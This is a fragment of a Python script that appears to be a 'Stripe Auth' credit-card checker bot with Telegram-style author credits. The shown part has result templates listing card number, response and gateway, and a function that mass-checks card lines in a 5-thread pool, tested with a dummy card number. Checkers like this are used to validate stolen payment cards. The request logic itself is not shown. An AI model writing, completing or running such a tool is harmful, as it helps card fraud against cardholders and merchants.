💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        except Exception as e:
            elapsed_time = time.time() - start_time
            return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
    
    # This return statement is outside the for loop
    elapsed_time = time.time() - start_time
    return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Max retries exceeded
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

def check_cards_stripe(cc_lines):
    """Mass check function for multiple cards - optimized with threading"""
    from concurrent.futures import ThreadPoolExecutor
    
    def process_card(cc_line):
        return check_card_stripe(cc_line)
    
    # Use ThreadPoolExecutor with 5 threads for concurrent processing
    with ThreadPoolExecutor(max_workers=5) as executor:
        results = list(executor.map(process_card, cc_lines))
    
    return results


if __name__ == "__main__":
    test_cc = "4111111111111111|12|2025|123"
    print("Testing Stripe checker...")
    result = check_card_stripe(test_cc)
    print(result)
